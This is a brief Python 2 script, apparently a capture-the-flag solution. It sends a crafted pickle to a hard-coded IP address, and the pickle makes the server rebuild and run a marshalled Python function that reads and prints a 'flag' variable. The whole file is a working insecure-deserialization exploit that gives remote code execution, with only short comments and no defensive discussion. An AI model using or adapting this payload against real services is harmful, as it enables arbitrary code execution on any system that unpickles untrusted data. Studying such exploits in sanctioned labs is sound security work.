import base64
import marshal
import requests


# This function will be serialized and sent to the server,
# then pickle will deserialize and call it
def func():
    import sys

    # Printing to stdout doesn't work, so this prints to stderr
    def p(m):
        print >> sys.stderr, m

    # Use p() to print stuff
    p("TEST")

    # When this function is called, we will be inside the pickle module,
    # so to print the flag it has to be accessed from __main__
    import __main__
    p(__main__.flag.flag)


# Wizardry to get pickle to execute the above function on the server
pckl = "ctypes\nFunctionType\n(cmarshal\nloads\n(cbase64\nb64decode\n(S'%s'\ntRtRc__builtin__\nglobals\n(tRS''\ntR(tR." % base64.b64encode(marshal.dumps(func.func_code))
r = requests.post('http://136.243.194.43', pckl)  # Send the pickle
print r.text
